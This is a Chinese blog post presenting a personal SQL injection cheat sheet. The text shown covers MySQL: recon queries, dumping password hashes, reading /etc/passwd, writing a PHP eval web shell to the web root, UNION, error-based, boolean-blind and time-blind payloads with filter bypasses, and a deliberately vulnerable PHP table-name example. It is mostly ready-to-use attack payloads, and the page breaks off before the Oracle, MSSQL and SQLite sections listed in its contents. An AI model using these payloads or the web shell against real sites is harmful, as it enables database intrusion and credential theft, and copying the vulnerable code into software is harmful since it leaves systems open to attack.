
 <!DOCTYPE HTML>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  
    <title>SQL注入备忘手册 | Bug&#39;小虫</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="小虫">
    

    
    <meta name="description" content="SQL备忘录，平时查阅用，随时更新。 MySQL常用信息及语句1234当前用户：user()数据库版本：version()数据库名: database()操作系统：@@version_compile_os 所有用户：1select group_concat(user) from mysql.user 用户hash：1select group_concat(password) from mysql.">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入备忘手册">
<meta property="og:url" content="http://yoursite.com/2018/06/07/SQL注入备忘手册/index.html">
<meta property="og:site_name" content="Bug&#39;小虫">
<meta property="og:description" content="SQL备忘录，平时查阅用，随时更新。 MySQL常用信息及语句1234当前用户：user()数据库版本：version()数据库名: database()操作系统：@@version_compile_os 所有用户：1select group_concat(user) from mysql.user 用户hash：1select group_concat(password) from mysql.">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2018-07-08T17:41:37.628Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="SQL注入备忘手册">
<meta name="twitter:description" content="SQL备忘录，平时查阅用，随时更新。 MySQL常用信息及语句1234当前用户：user()数据库版本：version()数据库名: database()操作系统：@@version_compile_os 所有用户：1select group_concat(user) from mysql.user 用户hash：1select group_concat(password) from mysql.">

    
    <link rel="alternative" href="/atom.xml" title="Bug&#39;小虫" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    <link rel="stylesheet" href="/css/style.css">
</head>

  <body>
    <header>
      
<div>
		
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="Bug&#39;小虫">Bug&#39;小虫</a></h1>
				<h2 class="blog-motto">走过黑暗，前面便是光</h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
					<li>
 					
					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
						<input type="hidden" name="q" value="site:yoursite.com">
					</form>
					
					</li>
				</ul>
			</nav>			
</div>
    </header>
    <div id="container">
      <div id="main" class="[layout]" itemscope itemprop="blogPost">
  
	<article itemprop="articleBody"> 
		<header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2018/06/07/SQL注入备忘手册/" title="SQL注入备忘手册" itemprop="url">SQL注入备忘手册</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2018-06-07T04:41:35.000Z" itemprop="datePublished"> 发表于 2018-06-07</time>
    
  </p>
</header>
	<div class="article-content">
		
		<div id="toc" class="toc-article">
			<strong class="toc-title">文章目录</strong>
		
			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL"><span class="toc-number">1.</span> <span class="toc-text">MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#常用信息及语句"><span class="toc-number">1.1.</span> <span class="toc-text">常用信息及语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UNION注入"><span class="toc-number">1.2.</span> <span class="toc-text">UNION注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#猜字段长度"><span class="toc-number">1.2.1.</span> <span class="toc-text">猜字段长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#暴字段位置"><span class="toc-number">1.2.2.</span> <span class="toc-text">暴字段位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基本语法"><span class="toc-number">1.2.3.</span> <span class="toc-text">基本语法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入"><span class="toc-number">1.3.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#floor"><span class="toc-number">1.3.1.</span> <span class="toc-text">floor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ExtractValue-有长度限制-最长32位"><span class="toc-number">1.3.2.</span> <span class="toc-text">ExtractValue(有长度限制,最长32位)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UpdateXml-有长度限制-最长32位"><span class="toc-number">1.3.3.</span> <span class="toc-text">UpdateXml(有长度限制,最长32位)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NAME-CONST-适用于低版本，不太好用"><span class="toc-number">1.3.4.</span> <span class="toc-text">NAME_CONST(适用于低版本，不太好用)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Error-based-Double-Query-Injection"><span class="toc-number">1.3.5.</span> <span class="toc-text">Error based Double Query Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-5-5-5以上"><span class="toc-number">1.3.6.</span> <span class="toc-text">exp(5.5.5以上)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BOOL盲注"><span class="toc-number">1.4.</span> <span class="toc-text">BOOL盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造布尔条件"><span class="toc-number">1.4.1.</span> <span class="toc-text">构造布尔条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造逻辑判断"><span class="toc-number">1.4.2.</span> <span class="toc-text">构造逻辑判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用order-by盲注"><span class="toc-number">1.4.3.</span> <span class="toc-text">利用order by盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#延时盲注"><span class="toc-number">1.5.</span> <span class="toc-text">延时盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一般格式"><span class="toc-number">1.5.1.</span> <span class="toc-text">一般格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#两个函数："><span class="toc-number">1.5.2.</span> <span class="toc-text">两个函数：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL注释符："><span class="toc-number">1.6.</span> <span class="toc-text">MySQL注释符：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#order-by后的注入"><span class="toc-number">1.7.</span> <span class="toc-text">order by后的注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#报错注入-1"><span class="toc-number">1.7.1.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bool盲注"><span class="toc-number">1.7.2.</span> <span class="toc-text">bool盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#延时盲注-1"><span class="toc-number">1.7.3.</span> <span class="toc-text">延时盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#表名可控注入"><span class="toc-number">1.8.</span> <span class="toc-text">表名可控注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#表名不完全可控且DESC的表名含有identifier-quote-SELECT的表名不含identifier-quote"><span class="toc-number">1.8.1.</span> <span class="toc-text">表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#表名不完全可控且DESC的表名不含identifier-quote-SELECT的表名含有identifier-quote"><span class="toc-number">1.8.2.</span> <span class="toc-text">表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无列明注入"><span class="toc-number">1.9.</span> <span class="toc-text">无列明注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#别名"><span class="toc-number">1.9.1.</span> <span class="toc-text">别名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#变量"><span class="toc-number">1.9.2.</span> <span class="toc-text">变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#可报错时爆表名、字段名、库名"><span class="toc-number">1.10.</span> <span class="toc-text">可报错时爆表名、字段名、库名</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#字段名"><span class="toc-number">1.10.1.</span> <span class="toc-text">字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#表名"><span class="toc-number">1.10.2.</span> <span class="toc-text">表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#库名"><span class="toc-number">1.10.3.</span> <span class="toc-text">库名</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Oracle"><span class="toc-number">2.</span> <span class="toc-text">Oracle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#常用信息及语句-1"><span class="toc-number">2.1.</span> <span class="toc-text">常用信息及语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入-2"><span class="toc-number">2.2.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#踩的一些坑"><span class="toc-number">2.3.</span> <span class="toc-text">踩的一些坑</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UNION每个字段类型必须相同"><span class="toc-number">2.3.1.</span> <span class="toc-text">UNION每个字段类型必须相同</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#必须跟FROM"><span class="toc-number">2.3.2.</span> <span class="toc-text">必须跟FROM</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSSQL"><span class="toc-number">3.</span> <span class="toc-text">MSSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#常用信息及语句-2"><span class="toc-number">3.1.</span> <span class="toc-text">常用信息及语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入-3"><span class="toc-number">3.2.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#执行命令"><span class="toc-number">3.3.</span> <span class="toc-text">执行命令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLite"><span class="toc-number">4.</span> <span class="toc-text">SQLite</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#常用信息及语句-3"><span class="toc-number">4.1.</span> <span class="toc-text">常用信息及语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BOOL盲注-1"><span class="toc-number">4.2.</span> <span class="toc-text">BOOL盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#延时盲注-2"><span class="toc-number">4.3.</span> <span class="toc-text">延时盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#写文件"><span class="toc-number">4.4.</span> <span class="toc-text">写文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#读文件"><span class="toc-number">4.5.</span> <span class="toc-text">读文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
		
		</div>
		
		<p>SQL备忘录，平时查阅用，随时更新。</p>
<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="常用信息及语句"><a href="#常用信息及语句" class="headerlink" title="常用信息及语句"></a>常用信息及语句</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当前用户：user()</span><br><span class="line">数据库版本：version()</span><br><span class="line">数据库名: database()</span><br><span class="line">操作系统：@@version_compile_os</span><br></pre></td></tr></table></figure>
<p>所有用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(user) from mysql.user</span><br></pre></td></tr></table></figure></p>
<p>用户hash：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(password) from mysql.user <span class="built_in">where</span> user=<span class="string">'root'</span></span><br></pre></td></tr></table></figure></p>
<p>所有数据库：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure></p>
<p>表名：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">'库名'</span></span><br><span class="line"></span><br><span class="line">//表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出来</span><br><span class="line">SELECT group_concat(table_name) from information_schema.table_constraints <span class="built_in">where</span> table_schema=<span class="string">'库名'</span></span><br></pre></td></tr></table></figure></p>
<p>字段名：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">'表名'</span></span><br></pre></td></tr></table></figure></p>
<p>读文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT load_file(<span class="string">'/etc/passwd'</span>)</span><br></pre></td></tr></table></figure></p>
<p>写文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);?&gt; into outfile <span class="string">'/var/www/html/shell.php'</span></span><br></pre></td></tr></table></figure></p>
<h2 id="UNION注入"><a href="#UNION注入" class="headerlink" title="UNION注入"></a>UNION注入</h2><h3 id="猜字段长度"><a href="#猜字段长度" class="headerlink" title="猜字段长度"></a>猜字段长度</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">order by num</span><br><span class="line">Example：id=1 order by 2 页面正常，id=3 order by 6页面错误，那么字段就是2</span><br><span class="line">字符型的话需要注释后面的引号，Example：id=1<span class="string">' order by 2%23</span></span><br></pre></td></tr></table></figure>
<h3 id="暴字段位置"><a href="#暴字段位置" class="headerlink" title="暴字段位置"></a>暴字段位置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 UNION SELECT 1,2或 id=-1 UNION SELECT 1,2</span><br></pre></td></tr></table></figure>
<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT 1,password,3 from admin</span><br></pre></td></tr></table></figure>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法</span><br></pre></td></tr></table></figure>
<h3 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br></pre></td></tr></table></figure>
<h3 id="ExtractValue-有长度限制-最长32位"><a href="#ExtractValue-有长度限制-最长32位" class="headerlink" title="ExtractValue(有长度限制,最长32位)"></a>ExtractValue(有长度限制,最长32位)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))</span><br></pre></td></tr></table></figure>
<h3 id="UpdateXml-有长度限制-最长32位"><a href="#UpdateXml-有长度限制-最长32位" class="headerlink" title="UpdateXml(有长度限制,最长32位)"></a>UpdateXml(有长度限制,最长32位)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br></pre></td></tr></table></figure>
<h3 id="NAME-CONST-适用于低版本，不太好用"><a href="#NAME-CONST-适用于低版本，不太好用" class="headerlink" title="NAME_CONST(适用于低版本，不太好用)"></a>NAME_CONST(适用于低版本，不太好用)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=261 and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)</span><br></pre></td></tr></table></figure>
<h3 id="Error-based-Double-Query-Injection"><a href="#Error-based-Double-Query-Injection" class="headerlink" title="Error based Double Query Injection"></a>Error based Double Query Injection</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1</span><br></pre></td></tr></table></figure>
<h3 id="exp-5-5-5以上"><a href="#exp-5-5-5以上" class="headerlink" title="exp(5.5.5以上)"></a>exp(5.5.5以上)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (select exp(~(select * from(select user())x)))</span><br></pre></td></tr></table></figure>
<h2 id="BOOL盲注"><a href="#BOOL盲注" class="headerlink" title="BOOL盲注"></a>BOOL盲注</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">盲注的时候一定注意，MySQL4之后大小写不敏感，可使用binary()函数使大小写敏感。</span><br></pre></td></tr></table></figure>
<h3 id="构造布尔条件"><a href="#构造布尔条件" class="headerlink" title="构造布尔条件"></a>构造布尔条件</h3><p>现在很多CTF比赛脑洞都出在了bool条件的构造，花式bool条件构造。<br>正常情况<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'or bool#</span></span><br><span class="line"><span class="string">true'</span>and bool<span class="comment">#</span></span><br><span class="line">```    </span><br><span class="line">不使用空格、注释</span><br><span class="line">```bash</span><br><span class="line"><span class="string">'or(bool)='</span>1</span><br><span class="line"><span class="literal">true</span><span class="string">'and(bool)='</span>1</span><br><span class="line">```    </span><br><span class="line">不使用or、and、注释</span><br><span class="line">```bash</span><br><span class="line"><span class="string">'^!(bool)='</span>1</span><br><span class="line"><span class="string">'=(bool)='</span></span><br><span class="line"><span class="string">'||(bool)='</span>1</span><br><span class="line"><span class="literal">true</span><span class="string">'%26%26(bool)='</span>1</span><br><span class="line"><span class="string">'=if((bool),1,0)='</span>0</span><br><span class="line">```    </span><br><span class="line">不使用等号、空格、注释</span><br><span class="line">```bash</span><br><span class="line"><span class="string">'or(bool)&lt;&gt;'</span>0</span><br><span class="line"><span class="string">'or((bool)in(1))or'</span>0</span><br><span class="line"> ```   </span><br><span class="line">其他</span><br><span class="line">```bash</span><br><span class="line">or (<span class="keyword">case</span> when (bool) <span class="keyword">then</span> 1 <span class="keyword">else</span> 0 end)</span><br></pre></td></tr></table></figure></p>
<p>有时候where字句有括号又猜不到SQL语句的时候，可以有下列类似的fuzz<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">' or (bool) or '</span>1<span class="string">'='</span>1</span><br><span class="line">1%<span class="string">' and (bool) or 1=1 and '</span>1<span class="string">'='</span>1</span><br></pre></td></tr></table></figure></p>
<h3 id="构造逻辑判断"><a href="#构造逻辑判断" class="headerlink" title="构造逻辑判断"></a>构造逻辑判断</h3><p>逻辑判断基本就那些函数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">left(user(),1)&gt;<span class="string">'r'</span>  </span><br><span class="line">right(user(),1)&gt;<span class="string">'r'</span>  </span><br><span class="line">substr(user(),1,1)=<span class="string">'r'</span>  </span><br><span class="line">mid(user(),1,1)=<span class="string">'r'</span> </span><br><span class="line">```    </span><br><span class="line">不使用逗号</span><br><span class="line">```bash </span><br><span class="line">user() regexp <span class="string">'^[a-z]'</span></span><br><span class="line">user() like <span class="string">'root%'</span></span><br><span class="line">POSITION(<span class="string">'root'</span> <span class="keyword">in</span> user())</span><br><span class="line">mid(user() from 1 <span class="keyword">for</span> 1)=<span class="string">'r'</span></span><br><span class="line">mid(user() from 1)=<span class="string">'r'</span></span><br><span class="line">ASCII()、ORD()和CHAR()函数一般用做辅助。</span><br></pre></td></tr></table></figure></p>
<h3 id="利用order-by盲注"><a href="#利用order-by盲注" class="headerlink" title="利用order by盲注"></a>利用order by盲注</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username=&apos;&apos; or 1 union select 1,2,&apos;5&apos; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | 2        | 5                                |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+----+----------+----------------------------------+</span><br></pre></td></tr></table></figure>
<p>2 rows in set (0.00 sec)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username=&apos;&apos; or 1 union select 1,2,&apos;6&apos; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 6                                |</span><br><span class="line">+----+----------+----------------------------------+</span><br></pre></td></tr></table></figure></p>
<p>2 rows in set (0.01 sec)<br>这种注入一般出现在登录处，形成bool条件。这里只获取password的值，也可以跟多个UNION查询其他的数据，此方法优点在于不使用括号等号等字符。利用order by姿势很多，自由发挥了。</p>
<h2 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h2><p>相对于bool盲注，就是把返回值0和1改为是否执行延时，能用其他方法就不使用延时。</p>
<h3 id="一般格式"><a href="#一般格式" class="headerlink" title="一般格式"></a>一般格式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((bool),sleep(3),0)和or (<span class="keyword">case</span> when (bool) <span class="keyword">then</span> sleep(3) <span class="keyword">else</span> 0 end)</span><br></pre></td></tr></table></figure>
<h3 id="两个函数："><a href="#两个函数：" class="headerlink" title="两个函数："></a>两个函数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(100000,MD5(1)) or sleep(5)</span><br></pre></td></tr></table></figure>
<p>BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep()</p>
<h2 id="MySQL注释符："><a href="#MySQL注释符：" class="headerlink" title="MySQL注释符："></a>MySQL注释符：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. -- -</span><br><span class="line">2. /* .... */</span><br><span class="line">3. <span class="comment">#</span></span><br><span class="line">4. `</span><br><span class="line">5. ;%00</span><br></pre></td></tr></table></figure>
<p>1.7 Insert&amp;Update注入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">insert和update一般使用报错注入</span><br><span class="line">如果没有错误回显，insert可以使用延时注入：</span><br><span class="line">update可以使用bool盲注和延时盲注。</span><br></pre></td></tr></table></figure></p>
<h2 id="order-by后的注入"><a href="#order-by后的注入" class="headerlink" title="order by后的注入"></a>order by后的注入</h2><h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))</span><br></pre></td></tr></table></figure>
<h3 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by IF((bool),1,(select 1 union select 2))</span><br></pre></td></tr></table></figure>
<h3 id="延时盲注-1"><a href="#延时盲注-1" class="headerlink" title="延时盲注"></a>延时盲注</h3><p>不推荐，因为每条数据都会执行延时，能用其他方法就不使用延时。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by IF(1,sleep(3),0);</span><br></pre></td></tr></table></figure></p>
<p>两条数据延时了6秒</p>
<h2 id="表名可控注入"><a href="#表名可控注入" class="headerlink" title="表名可控注入"></a>表名可控注入</h2><h3 id="表名不完全可控且DESC的表名含有identifier-quote-SELECT的表名不含identifier-quote"><a href="#表名不完全可控且DESC的表名含有identifier-quote-SELECT的表名不含identifier-quote" class="headerlink" title="表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote"></a>表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_query(<span class="string">"use b2cshop"</span>);</span><br><span class="line"><span class="variable">$table</span> = <span class="variable">$_GET</span>[<span class="string">'table'</span>];</span><br><span class="line">mysql_query(<span class="string">"desc `shop_&#123;<span class="variable">$table</span>&#125;`"</span>) or die(<span class="string">"DESC 出错:"</span>.mysql_error());</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select * from shop_&#123;<span class="variable">$table</span>&#125; where 1=1"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">var_dump(mysql_fetch_array(mysql_query(<span class="string">"<span class="variable">$sql</span>"</span>)));</span><br><span class="line"><span class="built_in">echo</span> mysql_error();</span><br></pre></td></tr></table></figure>
<p>shop_users 后面的两个<code></code>,做了shop_users 表的别名,所以无影响。<br>这时候desc的语句为,<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc `shop_users` `<span class="built_in">where</span> updatexml(1,concat(0x5e24,(select user()),0x5e24),1)<span class="comment">#`</span></span><br></pre></td></tr></table></figure></p>
